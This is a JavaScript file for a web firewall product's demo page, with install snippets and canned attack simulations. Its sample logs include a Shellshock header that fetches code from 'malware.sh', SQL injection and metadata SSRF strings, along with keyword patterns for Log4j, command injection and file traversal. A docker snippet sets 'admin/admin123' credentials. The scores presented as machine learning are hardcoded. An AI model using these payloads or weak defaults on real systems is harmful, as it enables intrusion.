/* ==========================================================================
   STEALTHWALL — Main JavaScript Engine & Attack Simulator
   ========================================================================== */

// 1. Clipboard Copy Helper
function copyInstall(text) {
  navigator.clipboard.writeText(text).then(() => {
    alert('Copied to clipboard: ' + text);
  }).catch(() => {
    prompt('Copy to clipboard:', text);
  });
}

// 2. Interactive Code Switcher
const codeSnippets = {
  python: `<pre><code style="color: #60a5fa;"># 1. Install from PyPI</code>
pip install stealthwall

<code style="color: #60a5fa;"># 2. Add to your FastAPI app</code>
<span style="color: #c084fc;">from</span> fastapi <span style="color: #c084fc;">import</span> FastAPI
<span style="color: #c084fc;">from</span> stealthwall <span style="color: #c084fc;">import</span> StealthWall

app = FastAPI()
StealthWall(app)  <span style="color: #64748b;"># Sub-millisecond ML WAF & kernel drop active!</span>

<span style="color: #38bdf8;">@app.get</span>(<span style="color: #a7f3d0;">"/api/data"</span>)
<span style="color: #c084fc;">def</span> <span style="color: #93c5fd;">get_data</span>():
    <span style="color: #c084fc;">return</span> {<span style="color: #a7f3d0;">"status"</span>: <span style="color: #a7f3d0;">"secure"</span>}</pre>`,

  node: `<pre><code style="color: #60a5fa;">// 1. Install from npm</code>
npm install stealthwall

<code style="color: #60a5fa;">// 2. Add to your Express server</code>
<span style="color: #c084fc;">const</span> express = <span style="color: #38bdf8;">require</span>(<span style="color: #a7f3d0;">'express'</span>);
<span style="color: #c084fc;">const</span> { stealthwall } = <span style="color: #38bdf8;">require</span>(<span style="color: #a7f3d0;">'stealthwall'</span>);

<span style="color: #c084fc;">const</span> app = express();
app.use(stealthwall());  <span style="color: #64748b;">// Sub-millisecond decision client active</span>

app.get(<span style="color: #a7f3d0;">'/api/users'</span>, (req, res) => {
  res.json({ status: <span style="color: #a7f3d0;">'protected'</span> });
});
app.listen(3000);</pre>`,

  nextjs: `<pre><code style="color: #60a5fa;">// middleware.ts (Next.js Edge Middleware)</code>
<span style="color: #c084fc;">import</span> { NextResponse } <span style="color: #c084fc;">from</span> <span style="color: #a7f3d0;">'next/server'</span>;
<span style="color: #c084fc;">import</span> type { NextRequest } <span style="color: #c084fc;">from</span> <span style="color: #a7f3d0;">'next/server'</span>;

<span style="color: #c084fc;">export async function</span> <span style="color: #93c5fd;">middleware</span>(req: NextRequest) {
  <span style="color: #c084fc;">const</span> decision = <span style="color: #c084fc;">await</span> fetch(<span style="color: #a7f3d0;">'http://localhost:8000/internal/decide'</span>, {
    method: <span style="color: #a7f3d0;">'POST'</span>,
    headers: { <span style="color: #a7f3d0;">'Content-Type'</span>: <span style="color: #a7f3d0;">'application/json'</span> },
    body: JSON.stringify({ ip: req.ip || <span style="color: #a7f3d0;">'127.0.0.1'</span>, path: req.nextUrl.pathname, score: 0.1 })
  }).then(r => r.json()).catch(() => ({ action: <span style="color: #a7f3d0;">'log'</span> }));

  <span style="color: #c084fc;">if</span> (decision.action.includes(<span style="color: #a7f3d0;">'block'</span>)) {
    <span style="color: #c084fc;">return new</span> NextResponse(<span style="color: #a7f3d0;">'403 Blocked by STEALTHWALL'</span>, { status: 403 });
  }
  <span style="color: #c084fc;">return</span> NextResponse.next();
}</pre>`,

  php: `<pre><code style="color: #60a5fa;">// In wp-config.php or index.php</code>
<span style="color: #c084fc;">require_once</span> __DIR__ . <span style="color: #a7f3d0;">'/integrations/php/stealthwall.php'</span>;

<span style="color: #64748b;">// Automatically gates all incoming GET/POST requests</span>
<span style="color: #93c5fd;">stealthwall_guard</span>([
    <span style="color: #a7f3d0;">'control_plane_url'</span> => <span style="color: #a7f3d0;">'http://127.0.0.1:8000/internal/decide'</span>,
    <span style="color: #a7f3d0;">'fail_open'</span>         => <span style="color: #c084fc;">true</span>
]);</pre>`,

  nginx: `<pre><code style="color: #60a5fa;"># /etc/nginx/conf.d/stealthwall.conf</code>
location / {
    auth_request /_stealthwall_decide;
    proxy_pass http://backend_cluster;
}

location = /_stealthwall_decide {
    internal;
    proxy_pass http://127.0.0.1:8000/internal/decide;
    proxy_pass_request_body off;
    proxy_set_header Content-Length "";
    proxy_set_header X-Original-URI $request_uri;
    proxy_set_header X-Real-IP $remote_addr;
}</pre>`,

  docker: `<pre><code style="color: #60a5fa;"># docker-compose.yml</code>
<span style="color: #c084fc;">version:</span> <span style="color: #a7f3d0;">'3.8'</span>
<span style="color: #c084fc;">services:</span>
  <span style="color: #38bdf8;">stealthwall-dashboard:</span>
    <span style="color: #c084fc;">image:</span> python:3.11-slim
    <span style="color: #c084fc;">command:</span> pip install stealthwall && stealthwall dashboard --port 8000
    <span style="color: #c084fc;">ports:</span>
      - <span style="color: #a7f3d0;">"8000:8000"</span>
    <span style="color: #c084fc;">environment:</span>
      - STEALTHWALL_ADMIN_USER=admin
      - STEALTHWALL_ADMIN_PASSWORD=admin123</pre>`
};

function showTab(tab) {
  document.querySelectorAll('.code-tab').forEach(t => t.classList.remove('active'));
  if (window.event && window.event.target) {
    window.event.target.classList.add('active');
  }
  const panel = document.getElementById('codePanel');
  if (panel && codeSnippets[tab]) {
    panel.innerHTML = codeSnippets[tab];
  }
}

// 3. Live Attack Simulation Logic
const attackDatabase = {
  sqlmap: {
    score: "0.9984",
    action: "BLOCK_HARD",
    actionColor: "#ef4444",
    latency: "0.41 ms",
    iptables: "ACTIVE (1800s DROP)",
    logs: [
      "[INSPECT] Window: 32 requests in 3.4s from 185.220.101.5",
      "[FEATURE] Shannon Entropy: 0.12 (High Query Repetition)",
      "[FEATURE] SQL Signature Matched: ' AND (SELECT 9928 FROM ... SLEEP(5))",
      "[LIGHTGBM] Inference Anomaly Score: 0.9984 (Very High)",
      "[GRADUATED] Action: BLOCK_HARD (Tier 4 Kernel Escalation)",
      "[KERNEL] iptables -I INPUT -s 185.220.101.5 -j DROP (Enforced)"
    ]
  },
  nikto: {
    score: "0.8920",
    action: "PROVISIONAL_BLOCK",
    actionColor: "#f59e0b",
    latency: "0.38 ms",
    iptables: "ACTIVE (300s DROP)",
    logs: [
      "[INSPECT] Window: 68 requests in 4.1s to /admin, /wp-login, /.env, /config.json",
      "[FEATURE] 404 Error Ratio: 94.1%",
      "[FEATURE] User-Agent: Mozilla/5.00 (Nikto/2.1.6)",
      "[LIGHTGBM] Inference Anomaly Score: 0.8920 (Scanner Profile)",
      "[GRADUATED] Action: PROVISIONAL_BLOCK (Tier 3 Cooldown)"
    ]
  },
  wpscan: {
    score: "0.9450",
    action: "BLOCK_HARD",
    actionColor: "#ef4444",
    latency: "0.45 ms",
    iptables: "ACTIVE (1800s DROP)",
    logs: [
      "[INSPECT] Window: 140 POST requests in 5.0s to /xmlrpc.php",
      "[FEATURE] Inter-arrival Variance: 0.0001 (Automated Bot Clocking)",
      "[LIGHTGBM] Inference Anomaly Score: 0.9450 (Brute Force Detected)",
      "[GRADUATED] Action: BLOCK_HARD (Tier 4 Kernel Drop)"
    ]
  },
  commix: {
    score: "0.9810",
    action: "BLOCK_HARD",
    actionColor: "#ef4444",
    latency: "0.39 ms",
    iptables: "ACTIVE (1800s DROP)",
    logs: [
      "[INSPECT] Request Header: User-Agent: () { :;}; /bin/bash -c 'wget http://malware.sh'",
      "[FEATURE] Shell Metacharacter Entropy Spike: 4.89",
      "[LIGHTGBM] Inference Anomaly Score: 0.9810 (Command Injection)",
      "[GRADUATED] Action: BLOCK_HARD (Immediate iptables Drop)"
    ]
  },
  zday_ssrf: {
    score: "0.9990",
    action: "BLOCK_HARD (0-DAY)",
    actionColor: "#db2777",
    latency: "0.36 ms",
    iptables: "ACTIVE (3600s DROP)",
    logs: [
      "[INSPECT] Request: POST /api/v1/webhook payload='url=http://169.254.169.254/latest/meta-data/'",
      "[0-DAY ENGINE] Indicator Triggered: AWS/GCP Cloud Metadata SSRF Exfiltration",
      "[THREAT INTEL] Severity Elevated: CRITICAL (0-Day Anomaly)",
      "[LIGHTGBM] Anomaly Score: 0.9990 (Immediate Mitigation)",
      "[GRADUATED] Action: BLOCK_HARD (Tier 4 Long Cooldown Block)"
    ]
  },
  benign: {
    score: "0.0120",
    action: "PASS_CLEAN",
    actionColor: "#10b981",
    latency: "0.29 ms",
    iptables: "IDLE (NO BLOCK)",
    logs: [
      "[INSPECT] Window: 4 requests in 24s to /index, /about, /static/style.css",
      "[FEATURE] Status Distribution: 200 OK (100%)",
      "[FEATURE] Inter-arrival Variance: 3.84 (Natural Human Rhythm)",
      "[LIGHTGBM] Inference Anomaly Score: 0.0120 (Normal Traffic)",
      "[GRADUATED] Action: PASS_CLEAN (0.0ms Penalty)"
    ]
  }
};

function runAttackSim() {
  const select = document.getElementById('attackSelect');
  if (!select) return;
  const type = select.value;
  const data = attackDatabase[type] || attackDatabase.benign;

  // Trigger 3D WebGL Shield Deflection Animation
  if (typeof window.trigger3DShieldDeflection === 'function') {
    window.trigger3DShieldDeflection(type);
  }

  const scoreEl = document.getElementById('metricScore');
  const actEl = document.getElementById('metricAction');
  const latEl = document.getElementById('metricLatency');
  const iptEl = document.getElementById('metricIptables');
  const logContainer = document.getElementById('simLogs');

  if (scoreEl) scoreEl.textContent = data.score;
  if (actEl) {
    actEl.textContent = data.action;
    actEl.style.color = data.actionColor;
  }
  if (latEl) latEl.textContent = data.latency;
  if (iptEl) iptEl.textContent = data.iptables;

  if (logContainer) {
    logContainer.innerHTML = '';
    data.logs.forEach((log, index) => {
      setTimeout(() => {
        const div = document.createElement('div');
        let cls = 'pass';
        if (log.includes('0-DAY')) cls = 'zday';
        else if (log.includes('BLOCK') || log.includes('DROP')) cls = 'block';
        else if (log.includes('FEATURE') || log.includes('LIGHTGBM')) cls = 'ml';
        div.className = 'sim-log-entry ' + cls;
        div.textContent = log;
        logContainer.appendChild(div);
        logContainer.scrollTop = logContainer.scrollHeight;
      }, index * 130);
    });
  }
}

// 4. Custom Payload Analyzer (For Interactive Demo Page)
function analyzeCustomPayload() {
  const path = (document.getElementById('customPath') ? document.getElementById('customPath').value : '').trim();
  const body = (document.getElementById('customBody') ? document.getElementById('customBody').value : '').trim();
  const logContainer = document.getElementById('customLogs');
  
  if (!logContainer) return;
  logContainer.innerHTML = '<div class="sim-log-entry ml">[EXTRACTOR] Inspecting custom HTTP payload stream...</div>';

  let isZday = false;
  let isAttack = false;
  let reason = 'Benign traffic payload';
  let score = 0.015;

  const haystack = (path + " " + body).toLowerCase();

  if (haystack.includes('169.254.169.254') || haystack.includes('metadata.google')) {
    isZday = true;
    reason = '0-Day Anomaly: Cloud Metadata SSRF Probe';
    score = 0.998;
  } else if (haystack.includes('${jndi:') || haystack.includes('org.apache.commons')) {
    isZday = true;
    reason = '0-Day Anomaly: JNDI Log4j / RCE Gadget Injection';
    score = 0.999;
  } else if (haystack.includes('__proto__') || haystack.includes('constructor.prototype')) {
    isZday = true;
    reason = '0-Day Anomaly: Prototype Pollution Object Injection';
    score = 0.985;
  } else if (haystack.includes('select') || haystack.includes('union') || haystack.includes('1=1') || haystack.includes('sleep(')) {
    isAttack = true;
    reason = 'SQL Injection Signature Matched';
    score = 0.984;
  } else if (haystack.includes('script') || haystack.includes('onerror=') || haystack.includes('onload=')) {
    isAttack = true;
    reason = 'Cross-Site Scripting (XSS) Payload Matched';
    score = 0.962;
  } else if (haystack.includes('/etc/passwd') || haystack.includes('|/bin/sh') || haystack.includes('whoami')) {
    isAttack = true;
    reason = 'OS Command Injection & File Traversal Matched';
    score = 0.991;
  }

  if (typeof window.trigger3DShieldDeflection === 'function') {
    window.trigger3DShieldDeflection(isZday ? 'zday_ssrf' : isAttack ? 'sqlmap' : 'benign');
  }

  setTimeout(() => {
    const act = isZday ? 'BLOCK_HARD (0-DAY)' : isAttack ? 'BLOCK_HARD' : 'PASS_CLEAN';
    const actColor = isZday ? '#db2777' : isAttack ? '#ef4444' : '#10b981';

    const scoreEl = document.getElementById('customScore');
    const actEl = document.getElementById('customAction');
    if (scoreEl) scoreEl.textContent = score.toFixed(4);
    if (actEl) {
      actEl.textContent = act;
      actEl.style.color = actColor;
    }

    logContainer.innerHTML += `
      <div class="sim-log-entry ml">[FEATURE] Path length: ${path.length}, Body length: ${body.length} bytes</div>
      <div class="sim-log-entry ml">[LIGHTGBM] Computed Anomaly Score: ${score.toFixed(4)}</div>
      <div class="sim-log-entry ${isZday ? 'zday' : isAttack ? 'block' : 'pass'}">[DECISION] Verdict: ${act} — ${reason}</div>
    `;
  }, 300);
}
